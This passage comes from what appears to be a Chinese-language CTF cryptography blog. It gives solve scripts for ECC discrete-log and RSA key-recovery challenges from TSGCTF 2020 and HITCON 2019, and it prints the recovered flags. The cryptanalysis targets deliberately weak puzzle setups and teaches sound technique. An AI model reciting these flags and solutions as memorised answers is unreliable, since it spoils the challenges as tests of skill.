class="line">flag = bytes_to_long(flag[<span class="number">5</span>:-<span class="number">1</span>])</span><br><span class="line">ecc = super_ecc()</span><br><span class="line">G = (<span class="number">30539694658216287049186009602647603628954716157157860526895528661673536165645</span>,</span><br><span class="line">     <span class="number">64972626416868540980868991814580825204126662282378873382506584276702563849986</span>)</span><br><span class="line">S = ecc.mul(flag, G)</span><br><span class="line"><span class="built_in">print</span>(S)</span><br><span class="line"><span class="comment"># (98194560294138607903211673286210561363390596541458961277934545796708736630623,</span></span><br><span class="line"><span class="comment"># 58504021112693314176230785309962217759011765879155504422231569879170659690008)</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>涨知识了 orz<br>题目给的曲线形式是一条扭曲爱德华曲线 <a href="https://www.zhihu.com/question/290541183">https://www.zhihu.com/question/290541183</a><br>本题的形式为 <code>a*x^2+y^2=c^2(1+d*x^2*y^2)</code><br>其实椭圆曲线除了weierstrass形式常见的还有另外两种: 蒙哥马利曲线和扭曲爱德华曲线<br>所以这道题我们按照文章的方法将扭曲爱德华曲线-&gt;蒙哥马利曲线-&gt;维尔斯特拉斯曲线<br>注意要先将曲线变为 <code>a*v^2+w^2=1+d*v^2*w^2</code> 的形式</p>
<p><img src="https://s2.loli.net/2023/12/09/E9PyomncQWxMLre.png" alt="img"></p>
<p><img src="https://s2.loli.net/2023/12/09/sr59aSMuKceTk2b.png" alt="img"></p>
<p>直接搬官方题解的了 (其实就是照着公式打就行了)</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">p = <span class="number">101194790049284589034264952247851014979689350430642214419992564316981817280629</span></span><br><span class="line">a = <span class="number">73101304688827564515346974949973801514688319206271902046500036921488731301311</span></span><br><span class="line">c = <span class="number">78293161515104296317366169782119919020288033620228629011270781387408756505563</span></span><br><span class="line">d = <span class="number">37207943854782934242920295594440274620695938273948375125575487686242348905415</span></span><br><span class="line">P.&lt;z&gt; = PolynomialRing(Zmod(p))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 形式&#x27;标准&#x27;化</span></span><br><span class="line">aa = a</span><br><span class="line">dd = (d*c^<span class="number">4</span>)%p</span><br><span class="line">J = (<span class="number">2</span>*(aa+dd)*inverse_mod(aa-dd,p))%p</span><br><span class="line">K = (<span class="number">4</span>*inverse_mod(aa-dd,p))%p</span><br><span class="line">A = ((<span class="number">3</span>-J^<span class="number">2</span>)*inverse_mod(<span class="number">3</span>*K^<span class="number">2</span>,p))%p</span><br><span class="line">B = ((<span class="number">2</span>*J^<span class="number">3</span>-<span class="number">9</span>*J)*inverse_mod(<span class="number">27</span>*K^<span class="number">3</span>,p))%p</span><br><span class="line"></span><br><span class="line"><span class="comment"># 这部分是为了 weier-&gt;twist</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span>  P(z^<span class="number">3</span>+A*z+B).roots():</span><br><span class="line">    alpha = <span class="built_in">int</span>(i[<span class="number">0</span>])</span><br><span class="line">    <span class="built_in">print</span>(kronecker(<span class="number">3</span>*alpha^<span class="number">2</span>+A,p))</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> P(z^<span class="number">2</span>-(<span class="number">3</span>*alpha^<span class="number">2</span>+A)).roots():</span><br><span class="line">        s = <span class="built_in">int</span>(j[<span class="number">0</span>])</span><br><span class="line">        s = inverse_mod(s, p)</span><br><span class="line">        <span class="keyword">if</span> J==alpha*<span class="number">3</span>*s%p:</span><br><span class="line">            Alpha = alpha</span><br><span class="line">            S = s</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">twist_to_weier</span>(<span class="params">x,y</span>): <span class="comment"># twist-&gt;mgml-&gt;weier</span></span><br><span class="line">    v = x*inverse_mod(c,p)%p</span><br><span class="line">    w = y*inverse_mod(c,p)%p</span><br><span class="line">    <span class="keyword">assert</span> (aa*v^<span class="number">2</span>+w^<span class="number">2</span>)%p==(<span class="number">1</span>+dd*v^<span class="number">2</span>*w^<span class="number">2</span>)%p</span><br><span class="line">    s = (<span class="number">1</span>+w)*inverse_mod(<span class="number">1</span>-w,p)%p <span class="comment"># s = (1+ω)/(1-ω)</span></span><br><span class="line">    t = s*inverse_mod(v,p)%p <span class="comment"># t = s/v</span></span><br><span class="line">    <span class="keyword">assert</span> (K*t^<span class="number">2</span>)%p==(s^<span class="number">3</span>+J*s^<span class="number">2</span>+s)%p</span><br><span class="line">    xW = (<span class="number">3</span>*s+J) * inverse_mod(<span class="number">3</span>*K, p) % p <span class="comment"># s = (3*K*x-J)/3</span></span><br><span class="line">    yW = t * inverse_mod(K, p) % p <span class="comment"># t = y/K</span></span><br><span class="line">    <span class="keyword">assert</span> yW^<span class="number">2</span> % p == (xW^<span class="number">3</span>+A*xW+B) % p</span><br><span class="line">    <span class="keyword">return</span> (xW,yW)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">weier_to_twist</span>(<span class="params">x,y</span>):</span><br><span class="line">    xM=S*(x-Alpha)%p</span><br><span class="line">    yM=S*y%p</span><br><span class="line">    <span class="keyword">assert</span> (K*yM^<span class="number">2</span>)%p==(xM^<span class="number">3</span>+J*xM^<span class="number">2</span>+xM)%p</span><br><span class="line">    xe = xM*inverse_mod(yM,p)%p</span><br><span class="line">    ye = (xM-<span class="number">1</span>)*inverse_mod(xM+<span class="number">1</span>,p)%p</span><br><span class="line">    <span class="keyword">assert</span> (aa*xe^<span class="number">2</span>+ye^<span class="number">2</span>)%p==(<span class="number">1</span>+dd*xe^<span class="number">2</span>*ye^<span class="number">2</span>)%p</span><br><span class="line">    xq = xe*c%p</span><br><span class="line">    yq = ye*c%p</span><br><span class="line">    <span class="keyword">assert</span> (a*xq^<span class="number">2</span>+yq^<span class="number">2</span>)%p==c^<span class="number">2</span>*(<span class="number">1</span>+d*xq^<span class="number">2</span>*yq^<span class="number">2</span>)</span><br><span class="line">    <span class="keyword">return</span> (xq,yq)</span><br><span class="line"></span><br><span class="line">E = EllipticCurve(GF(p), [A, B])</span><br><span class="line">G = twist_to_weier(<span class="number">30539694658216287049186009602647603628954716157157860526895528661673536165645</span>,<span class="number">64972626416868540980868991814580825204126662282378873382506584276702563849986</span>)</span><br><span class="line">Q = twist_to_weier(<span class="number">98194560294138607903211673286210561363390596541458961277934545796708736630623</span>,<span class="number">58504021112693314176230785309962217759011765879155504422231569879170659690008</span>)</span><br><span class="line">P = E(G)</span><br><span class="line">Q = E(Q)</span><br></pre></td></tr></table></figure>

<p>接下来就是在熟悉的维尔斯特拉斯曲线上求 flag*G &#x3D; Q 问题了<br>总共就那么几种方法(DLP,SmartAttack,CRT+PohligHellman)<br>发现P的阶能分解 所以直接Pohlig-Hellman 即可</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">factors, exponents = <span class="built_in">zip</span>(*factor(P.order()))</span><br><span class="line">primes = [factors[i] ^ exponents[i] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(factors))][:-<span class="number">2</span>]</span><br><span class="line"><span class="built_in">print</span>(primes)</span><br><span class="line">dlogs = []</span><br><span class="line"><span class="keyword">for</span> fac <span class="keyword">in</span> primes:</span><br><span class="line">    t = <span class="built_in">int</span>(<span class="built_in">int</span>(P.order()) // <span class="built_in">int</span>(fac))</span><br><span class="line">    dlog = discrete_log(t*Q,t*P,operation=<span class="string">&quot;+&quot;</span>)</span><br><span class="line">    dlogs += [dlog]</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;factor: &quot;</span>+<span class="built_in">str</span>(fac)+<span class="string">&quot;, Discrete Log: &quot;</span>+<span class="built_in">str</span>(dlog)) <span class="comment">#calculates discrete logarithm for each prime order</span></span><br><span class="line">flag=crt(dlogs,primes)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment"># Tw1stzzzz</span></span><br></pre></td></tr></table></figure>
<hr>
<hr>
<p>大致列举了一些题目&#x2F;知识点<br>ECC很多进阶地方都需要较好的群论基础 等学的更扎实了再回来看 希望能有更深的体会</p>
]]></content>
      <categories>
        <category>CTF-Crypto</category>
      </categories>
  </entry>
  <entry>
    <title>Crypto-Other</title>
    <url>/2023/12/04/Crypto-Other/</url>
    <content><![CDATA[<p>一些杂题(密码)&#x2F; (以前)比赛的密码题</p>
<span id="more"></span>

<h1 id="tsgctf2020"><a href="#tsgctf2020" class="headerlink" title="tsgctf2020"></a>tsgctf2020</h1><h2 id="beginners-crypto"><a href="#beginners-crypto" class="headerlink" title="beginners_crypto"></a>beginners_crypto</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">assert</span>(<span class="built_in">len</span>(<span class="built_in">open</span>(<span class="string">&#x27;flag.txt&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>).read()) &lt;= <span class="number">50</span>)</span><br><span class="line"><span class="keyword">assert</span>(<span class="built_in">str</span>(<span class="built_in">int</span>.from_bytes(<span class="built_in">open</span>(<span class="string">&#x27;flag.txt&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>).read(), byteorder=<span class="string">&#x27;big&#x27;</span>) &lt;&lt; <span class="number">10000</span>).endswith(<span class="string">&#x27;1002773875431658367671665822006771085816631054109509173556585546508965236428620487083647585179992085437922318783218149808537210712780660412301729655917441546549321914516504576&#x27;</span>))</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>搁着开始没搞懂题目意思…<br>这其实就等价于 给出 <code>m*2**10000 = s (mod 10**175)</code>…<br>由于不互素 不能直接将逆元乘过去<br>两种方法:</p>
<h3 id="Solution1"><a href="#Solution1" class="headerlink" title="Solution1"></a>Solution1</h3><p>观察他们的gcd发现可以全部除掉</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">x =  (<span class="built_in">pow</span>(<span class="number">2</span>,<span class="number">10000</span>,<span class="number">10</span>**<span class="number">175</span>))</span><br><span class="line">n = <span class="number">10</span>**<span class="number">175</span></span><br><span class="line"><span class="built_in">print</span>(gcd(x,n))</span><br><span class="line"><span class="built_in">print</span>(gcd(s,n))</span><br><span class="line">GCD = gcd(s,n)</span><br><span class="line">s //= GCD</span><br><span class="line">x //= GCD</span><br><span class="line">n //= GCD</span><br><span class="line"><span class="keyword">from</span> primefac <span class="keyword">import</span> *</span><br><span class="line">m = modinv(x,n)*s%n</span><br><span class="line"><span class="built_in">print</span>(n2s(<span class="built_in">int</span>(m)))</span><br></pre></td></tr></table></figure>
<h3 id="Solution2"><a href="#Solution2" class="headerlink" title="Solution2"></a>Solution2</h3><p>可以改变模数 比如<code>10**175 -&gt; 5**175</code>这种<br>也就是选择新模数为原来模数的因子 且满足大于m的比特数即可</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">n = <span class="number">5</span>**<span class="number">175</span></span><br><span class="line"><span class="keyword">from</span> primefac <span class="keyword">import</span> *</span><br><span class="line">m = modinv(<span class="built_in">pow</span>(<span class="number">2</span>,<span class="number">10000</span>,n),n)*s%n</span><br><span class="line"><span class="built_in">print</span>(n2s(<span class="built_in">int</span>(m)))</span><br></pre></td></tr></table></figure>
<p>flag: TSGCTF{0K4y_Y0U_are_r3aDy_t0_Go_aNd_dO_M0r3_CryPt}</p>
<h2 id="modulus-amittendus"><a href="#modulus-amittendus" class="headerlink" title="modulus_amittendus"></a>modulus_amittendus</h2><p>题目给的是rugby代码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">require &#x27;openssl&#x27;</span><br><span class="line">require &#x27;json&#x27;</span><br><span class="line"></span><br><span class="line">def modinv(a, m)</span><br><span class="line">  m0, inv, x0 = m, 1, 0</span><br><span class="line">  while a &gt; 1</span><br><span class="line">    inv -= (a / m) * x0</span><br><span class="line">    a, m = m, a % m</span><br><span class="line">    inv, x0 = x0, inv</span><br><span class="line">  end</span><br><span class="line">  inv += m0 if inv &lt; 0</span><br><span class="line">  inv</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">class RSA</span><br><span class="line">  def initialize</span><br><span class="line">    @p = OpenSSL::BN::generate_prime(1024, true).to_i</span><br><span class="line">    @q = OpenSSL::BN::generate_prime(1024, true).to_i</span><br><span class="line">    @n = @p * @q</span><br><span class="line">    @e = 65537</span><br><span class="line">    @d = modinv(@e, (@p - 1) * (@q - 1))</span><br><span class="line">    @exp1 = @d % (@p - 1)</span><br><span class="line">    @exp2 = @d % (@q - 1)</span><br><span class="line">    @cf = modinv(@q, @p)</span><br><span class="line">  end</span><br><span class="line"></span><br><span class="line">  def encrypt(m)</span><br><span class="line">    m.pow(@e, @n)</span><br><span class="line">  end</span><br><span class="line"></span><br><span class="line">  def decrypt(c)</span><br><span class="line">    m1 = c.pow(@exp1, @p)</span><br><span class="line">    m2 = c.pow(@exp2, @q)</span><br><span class="line">    (m2 + @cf * (m1 - m2) % @p * @q) % @n</span><br><span class="line">  end</span><br><span class="line"></span><br><span class="line">  def pubkey</span><br><span class="line">    privkey.to_a[..2].to_h</span><br><span class="line">  end</span><br><span class="line"></span><br><span class="line">  def privkey</span><br><span class="line">    &#123;</span><br><span class="line">      e: @e,</span><br><span class="line">      n: @d,</span><br><span class="line">      cf: @cf,</span><br><span class="line">      p: @p,</span><br><span class="line">      q: @q,</span><br><span class="line">      exp1: @exp1,</span><br><span class="line">      exp2: @exp2,</span><br><span class="line">    &#125;</span><br><span class="line">  end</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">flag = File.read(&#x27;flag.txt&#x27;).unpack(&quot;H*&quot;)[0].hex</span><br><span class="line">rsa = RSA.new</span><br><span class="line">p rsa.encrypt(flag)</span><br><span class="line"></span><br><span class="line">File.write(&#x27;pubkey.json&#x27;, JSON.dump(rsa.pubkey))</span><br></pre></td></tr></table></figure>

<p>题目给了 d,e,c,modinv(q,p)要求m<br>没什么思路 瞄一眼WP 说是模仿的 HITCON2019LostModuleAgain 确实跟<a href="https://github.com/pcw109550/write-up/blob/master/2019/HITCON/Lost_Modulus_Again/README.md">原题</a>一模一样 </p>
<p>只是原题给了 modinv(p,q)和modinv(q,p)这里只给了一个?<br>干脆复现原题吧</p>
<h2 id="Sweet-like-Apple-Pie"><a href="#Sweet-like-Apple-Pie" class="headerlink" title="Sweet like Apple Pie"></a>Sweet like Apple Pie</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> decimal <span class="keyword">import</span> *</span><br><span class="line">getcontext().prec = <span class="number">300</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pi</span>():</span><br><span class="line">    lasts, t, s, n, na, d, da = <span class="number">0</span>, Decimal(<span class="number">3</span>), <span class="number">3</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">24</span></span><br><span class="line">    <span class="keyword">while</span> s != lasts:</span><br><span class="line">        lasts = s</span><br><span class="line">        n, na = n + na, na + <span class="number">8</span></span><br><span class="line">        d, da = d + da, da + <span class="number">32</span></span><br><span class="line">        t = (t * n) / d</span><br><span class="line">        s += t</span><br><span class="line">    <span class="keyword">return</span> s</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sin</span>(<span class="params">x</span>):</span><br><span class="line">    x = Decimal(x) % pi()</span><br><span class="line">    p, factor = <span class="number">0</span>, x</span><br><span class="line">    <span class="keyword">for</span> n <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10000</span>):</span><br><span class="line">        p += factor</span><br><span class="line">        factor *= - (x ** <span class="number">2</span>) / ((<span class="number">2</span> * n + <span class="number">2</span>) * (<span class="number">2</span> * n + <span class="number">3</span>))</span><br><span class="line">    <span class="keyword">return</span> p</span><br><span class="line"></span><br><span class="line">flag = <span class="built_in">int</span>.from_bytes(<span class="built_in">open</span>(<span class="string">&#x27;flag.txt&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>).read(), byteorder=<span class="string">&#x27;big&#x27;</span>)</span><br><span class="line"><span class="keyword">assert</span>(flag &lt; <span class="number">2</span> ** <span class="number">500</span>)</span><br><span class="line"><span class="built_in">print</span>(sin(flag))</span><br></pre></td></tr></table></figure>

<p>output.txt</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">0.162452474092990408037062573408259688253995107643493293584426591003988903469791005222132158897198623144937279539555347413553688190959907095952250683633029959235933436782707275021817801890433801800730214807785288112267446678747104887584191096749196212784470161670299495426679759221652356130008110761143</span><br></pre></td></tr></table></figure>

<p>??? 完全不会… 这能还原?<br>只能看题解了<br><a href="https://ctftime.org/writeup/22580">https://ctftime.org/writeup/22580</a></p>
<p>orz<br>题解思路大致学到了 代码实现还有点小问题(题解的solve也跑不出来啊…O0o?)</p>
<h1 id="HITCON2019"><a href="#HITCON2019" class="headerlink" title="HITCON2019"></a>HITCON2019</h1><h2 id="Lost-Modulus-Again"><a href="#Lost-Modulus-Again" class="headerlink" title="Lost Modulus Again"></a>Lost Modulus Again</h2><p>题目就不贴了 就是RSA 已知e,d,modinv(p,q),modinv(q,p)求m<br>数据:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">Key([e = <span class="number">1048583</span>, n = <span class="number">20899585599499852848600179189763086698516108548228367107221738096450499101070075492197700491683249172909869748620431162381087017866603003080844372390109407618883775889949113518883655204495367156356586733638609604914325927159037673858380872827051492954190012228501796895529660404878822550757780926433386946425164501187561418082866346427628551763297010068329425460680225523270632454412376673863754258135691783420342075219153761633410012733450586771838248239221434791288928709490210661095249658730871114233033907339401132548352479119599592161475582267434069666373923164546185334225821332964035123667137917080001159691927</span>, x = <span class="number">22886390627173202444468626406642274959028635116543626995297684671305848436910064602418012808595951325519844918478912090039470530649857775854959462500919029371215000179065185673136642143061689849338228110909931445119687113803523924040922470616407096745128917352037282612768345609735657018628096338779732460743</span>, y = <span class="number">138356012157150927033117814862941924437637775040379746970778376921933744927520585574595823734209547857047013402623714044512594300691782086053475259157899010363944831564630625623351267412232071416191142966170634950729938561841853176635423819365023039470901382901261884795304947251115006930995163847675576699331</span>])</span><br><span class="line">c = <span class="number">0x32074de818f2feeb788e36d7d3ee09f0000381584a72b2fba0dcc9a2ebe5fd79cf2d6fd40c4dbfea27d3489704f2c1a30b17a783baa67229d02043c5bc9bdb995ae984d80a96bd79370ea2c356f39f85a12d16983598c1fb772f9183441fea5dfeb5b26455df75de18ce70a6a9e9dbc0a4ca434ba94cf4d1e5347395cf7aafa756c8a5bd6fd166bc30245a4bded28f5baac38d024042a166369f7515e8b0c479a1965b5988b350064648738f6585c0a0d1463bd536d11a105bb926b44236593b5c6c71ef5b132cd9c211e8ad9131aa53ffde88f5b0df18e7c45bcdb6244edcaa8d386196d25297c259fca3be37f0f2015f40cb5423a918c51383390dfd5a8703</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>不得不说出的真的很好<br>脚本套多了真的会忽略这些大小估计 整除关系 转化方程… 这些思想在这道题体现的很充分</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">q*x = 1+k1*p</span><br><span class="line">p*y = 1+k2*q</span><br><span class="line">=&gt; q*(x+k2) = p*(y+k1)</span><br><span class="line">notice that x&lt;p y&lt;q k1&lt;q k2&lt;p</span><br><span class="line">and p,q are coprime</span><br><span class="line">=&gt; q|(y+k1) &amp; 0&lt;y+k1&lt;2q =&gt; y+k1=q</span><br><span class="line">the same as p =&gt; x+k2=p</span><br><span class="line">suprisingly, we actually have k1*k2+1=x*y   </span><br><span class="line">soshite</span><br><span class="line">=&gt; phi = (p-1)*(q-1)</span><br><span class="line">       = (x+k2-1)*(y+k1-1)</span><br><span class="line">       = (x-1)*(y-1)+k1*(x-1)+k2*(y-1)+k1*k2</span><br><span class="line"></span><br><span class="line">use the equal k1*k2+1=x*y above</span><br><span class="line">=&gt; (x-1)*k1**2+(x*y-1-phi+(x-1)*(y-1))*k1+(y-1)*(x*y-1)=0</span><br><span class="line">这样代入phi的所有可能值求解一个关于k1的二次方程 利用k1为整数的限制就能得到phi</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">e = <span class="number">1048583</span></span><br><span class="line">d = <span class="number">20899585599499852848600179189763086698516108548228367107221738096450499101070075492197700491683249172909869748620431162381087017866603003080844372390109407618883775889949113518883655204495367156356586733638609604914325927159037673858380872827051492954190012228501796895529660404878822550757780926433386946425164501187561418082866346427628551763297010068329425460680225523270632454412376673863754258135691783420342075219153761633410012733450586771838248239221434791288928709490210661095249658730871114233033907339401132548352479119599592161475582267434069666373923164546185334225821332964035123667137917080001159691927</span></span><br><span class="line">x = <span class="number">22886390627173202444468626406642274959028635116543626995297684671305848436910064602418012808595951325519844918478912090039470530649857775854959462500919029371215000179065185673136642143061689849338228110909931445119687113803523924040922470616407096745128917352037282612768345609735657018628096338779732460743</span></span><br><span class="line">y = <span class="number">138356012157150927033117814862941924437637775040379746970778376921933744927520585574595823734209547857047013402623714044512594300691782086053475259157899010363944831564630625623351267412232071416191142966170634950729938561841853176635423819365023039470901382901261884795304947251115006930995163847675576699331</span></span><br><span class="line">c = <span class="number">0x32074de818f2feeb788e36d7d3ee09f0000381584a72b2fba0dcc9a2ebe5fd79cf2d6fd40c4dbfea27d3489704f2c1a30b17a783baa67229d02043c5bc9bdb995ae984d80a96bd79370ea2c356f39f85a12d16983598c1fb772f9183441fea5dfeb5b26455df75de18ce70a6a9e9dbc0a4ca434ba94cf4d1e5347395cf7aafa756c8a5bd6fd166bc30245a4bded28f5baac38d024042a166369f7515e8b0c479a1965b5988b350064648738f6585c0a0d1463bd536d11a105bb926b44236593b5c6c71ef5b132cd9c211e8ad9131aa53ffde88f5b0df18e7c45bcdb6244edcaa8d386196d25297c259fca3be37f0f2015f40cb5423a918c51383390dfd5a8703</span></span><br><span class="line"><span class="keyword">from</span> primefac <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> iroot,gcd</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># First to calculate possible phis</span></span><br><span class="line">phis = []</span><br><span class="line">kphi = d*e-<span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>,e):</span><br><span class="line">    <span class="keyword">if</span>(kphi%k==<span class="number">0</span>):</span><br><span class="line">        phi = kphi//k</span><br><span class="line">        <span class="keyword">if</span>(gcd(e,phi)==<span class="number">1</span>):</span><br><span class="line">            phis.append(phi)</span><br><span class="line"><span class="comment"># print(len(phis)) # 923</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Then use</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> phi <span class="keyword">in</span> phis:</span><br><span class="line">    a = (x-<span class="number">1</span>)</span><br><span class="line">    b = (x*y-<span class="number">1</span>-phi+(x-<span class="number">1</span>)*(y-<span class="number">1</span>))</span><br><span class="line">    cc = (y-<span class="number">1</span>)*(x*y-<span class="number">1</span>)</span><br><span class="line">    delta = b*b-<span class="number">4</span>*a*cc</span><br><span class="line">    <span class="keyword">if</span>(iroot(delta,<span class="number">2</span>)[<span class="number">1</span>]==<span class="literal">True</span>):</span><br><span class="line">        <span class="built_in">print</span>(phi)</span><br><span class="line">        k1 = (-b+iroot(delta,<span class="number">2</span>)[<span class="number">0</span>])//(<span class="number">2</span>*a)</span><br><span class="line">        k2 = (-b-iroot(delta,<span class="number">2</span>)[<span class="number">0</span>])//(<span class="number">2</span>*a)</span><br><span class="line">        <span class="built_in">print</span>(k1,k2)</span><br><span class="line"></span><br><span class="line">phi  = <span class="number">22509077260984027608263845908083202879597081619164800783060781115945741547031252889863077300004310236160814653393991988068104999928735140821504649764471313283345921984799288521496479399032837319974588038186917872597078510975400908137738190304700710900604891709265153418588830065918981914371070605822998222526936764035473024951172438654405051015158373989943636215751206002298354662255322404681649160859586893385153685796114347024559211776931935054744445492193990127160520676232531227390204623950157430966169435920800794748331292066769479560454753704770229274680560878024797177827265072368595931697411659251440631501728</span></span><br><span class="line">k1 = <span class="number">28208949439955302309848635580625081491778513331790561038922122543347871461021445160004265905257374948095564180270338913034580463560285897071083488435445872411686139458980129711508020003449180850634252661246277255619651792037014931213229280933988207275950107375275346841229515570544044065150714741967440182598</span></span><br><span class="line">q = y+k1</span><br><span class="line"><span class="keyword">assert</span> isPrime(q)</span><br><span class="line">p = phi//(q-<span class="number">1</span>)+<span class="number">1</span></span><br><span class="line">n = p*q</span><br><span class="line"><span class="comment"># print(n)</span></span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">pow</span>(c,d,n)))</span><br><span class="line"><span class="comment"># hitcon&#123;1t_is_50_easy_t0_find_th3_modulus_back@@!!@!@!@@!&#125;</span></span><br></pre></td></tr></table></figure>

<h2 id="Very-Simple-Haskell"><a href="#Very-Simple-Haskell" class="headerlink" title="Very Simple Haskell"></a>Very Simple Haskell</h2><figure class="highlight haskell"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> Data.Char</span><br><span class="line"><span class="keyword">import</span> System.IO</span><br><span class="line"></span><br><span class="line"><span class="title">n</span> :: <span class="type">Integer</span></span><br><span class="line"><span class="title">n</span> = <span class="number">134896036104102133446208954973118530800743044711419303630456535295204304771800100892609593430702833309387082353959992161865438523195671760946142657809228938824313865760630832980160727407084204864544706387890655083179518455155520501821681606874346463698215916627632418223019328444607858743434475109717014763667</span></span><br><span class="line"></span><br><span class="line"><span class="title">k</span> :: <span class="type">Int</span></span><br><span class="line"><span class="title">k</span> = <span class="number">131</span></span><br><span class="line"></span><br><span class="line"><span class="title">primes</span> :: [<span class="type">Integer</span>]</span><br><span class="line"><span class="title">primes</span> = take k $ sieve (<span class="number">2</span> : [<span class="number">3</span>, <span class="number">5</span>..])</span><br><span class="line">  <span class="keyword">where</span></span><br><span class="line">    sieve (p:xs) = p : sieve [x|x &lt;- xs, x `mod` p &gt; <span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="title">stringToInteger</span> :: <span class="type">String</span> -&gt; <span class="type">Integer</span></span><br><span class="line"><span class="title">stringToInteger</span> str = foldl (\x y -&gt; (toInteger $ ord y) + x*<span class="number">256</span>) <span class="number">0</span> str</span><br><span class="line"></span><br><span class="line"><span class="title">integerToString</span> :: <span class="type">Integer</span> -&gt; <span class="type">String</span></span><br><span class="line"><span class="title">integerToString</span> num = f num <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">where</span></span><br><span class="line">        f <span class="number">0</span> str = str</span><br><span class="line">        f num str = f (div num <span class="number">256</span>) $ (:) (chr $ fromIntegral $ num `mod` <span class="number">256</span>) str</span><br><span class="line"></span><br><span class="line"><span class="title">numToBits</span> :: <span class="type">Integer</span> -&gt; [<span class="type">Int</span>]</span><br><span class="line"><span class="title">numToBits</span> num = f num []</span><br><span class="line">    <span class="keyword">where</span> </span><br><span class="line">        f <span class="number">0</span> arr = arr</span><br><span class="line">        f x arr = f (div x <span class="number">2</span>) ((fromInteger $ x `mod` <span class="number">2</span>) : arr)</span><br><span class="line"></span><br><span class="line"><span class="title">extendBits</span> :: <span class="type">Int</span> -&gt; [<span class="type">Int</span>] -&gt; [<span class="type">Int</span>]</span><br><span class="line"><span class="title">extendBits</span> blockLen arr</span><br><span class="line">    | len == <span class="number">0</span> = arr</span><br><span class="line">    | len &gt; <span class="number">0</span> = (replicate (blockLen-len) <span class="number">0</span>) ++ arr</span><br><span class="line">    <span class="keyword">where</span> len = (length arr) `mod` blockLen</span><br><span class="line"></span><br><span class="line"><span class="title">calc</span> :: <span class="type">Integer</span> -&gt; [<span class="type">Int</span>] -&gt; <span class="type">Integer</span></span><br><span class="line"><span class="title">calc</span> num [] = num</span><br><span class="line"><span class="title">calc</span> num arr = calc result restArr</span><br><span class="line">    <span class="keyword">where</span></span><br><span class="line">        num2 = num*num `mod` n</span><br><span class="line">        (block, restArr) = splitAt k arr</span><br><span class="line">        zipped = zipWith (\x y -&gt; ((fromIntegral x)*y) `mod` n) block primes  </span><br><span class="line">        mul = product $ filter (/=<span class="number">0</span>) zipped</span><br><span class="line">        result = num2*mul `mod` n</span><br><span class="line"></span><br><span class="line"><span class="title">magic</span> :: <span class="type">String</span> -&gt; <span class="type">String</span></span><br><span class="line"><span class="title">magic</span> input = result</span><br><span class="line">    <span class="keyword">where</span> </span><br><span class="line">        num = stringToInteger input</span><br><span class="line">        bits = numToBits num</span><br><span class="line">        extended = reverse $ extendBits <span class="number">8</span> bits</span><br><span class="line">        oriLen = length extended</span><br><span class="line">        extendedBits = extendBits k extended</span><br><span class="line">        oriLenBits = numToBits $ fromIntegral oriLen</span><br><span class="line">        extendedOriLenBits = extendBits k oriLenBits</span><br><span class="line">        finalBits = extendedOriLenBits ++ extendedBits</span><br><span class="line">        result = show $ calc <span class="number">1</span> (reverse finalBits)</span><br><span class="line"></span><br><span class="line"><span class="title">main</span> = <span class="keyword">do</span></span><br><span class="line">    flag &lt;- readFile <span class="string">&quot;flag&quot;</span></span><br><span class="line">    putStrLn.show $ length flag</span><br><span class="line">    putStrLn $ magic (<span class="string">&quot;the flag is hitcon&#123;&quot;</span> ++ flag ++ <span class="string">&quot;&#125;&quot;</span>) </span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>output</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">6</span><br><span class="line">84329776255618646348016649734028295037597157542985867506958273359305624184282146866144159754298613694885173220275408231387000884549683819822991588176788392625802461171856762214917805903544785532328453620624644896107723229373581460638987146506975123149045044762903664396325969329482406959546962473688947985096</span><br></pre></td></tr></table></figure>

